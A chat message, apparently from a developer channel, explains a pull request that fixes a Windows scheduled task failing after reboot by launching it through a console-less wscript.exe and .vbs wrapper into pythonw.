[2026-06-13T14:56:22.583000+00:00] jw_mushroom_man (id=1515369246576869550)
    . Going through #45599's breakdown: my PR did fixes B (XML settings) and C (uv-safe pythonw), but kept the cmd.exe /d /c action — so it never did fix A, the console-less wscript/.vbs launcher. The real reboot failure is 0xC000013A (CTRL_CLOSE_EVENT hitting the console), and RestartOnFailure can't catch that code, so the console has to go. Just pushed that: the task now runs wscript.exe //B //Nologo "<vbs>" → pythonw, both console-less. Verified on Win11 — the child reports has_console=false. Survived on my box before only because it auto-logs-in; yours doesn't, which is exactly why you saw it fail. Should close #45599 now.
